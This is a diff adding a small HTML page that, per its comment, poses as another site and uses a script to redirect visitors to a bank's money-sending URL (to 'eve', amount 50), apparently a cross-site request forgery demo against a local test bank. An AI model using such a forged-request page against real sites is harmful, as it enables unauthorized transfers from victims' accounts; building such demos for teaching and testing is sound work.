@@ -1,0 +1,5 @@
+<!-- Another site: it sends you on to the bank's link that sends money. -->
+<script>
+  const bank = new URLSearchParams(location.search).get('bank');
+  location = (bank ?? 'http://localhost:8081') + '/send?to=eve&amount=50';
+</script>
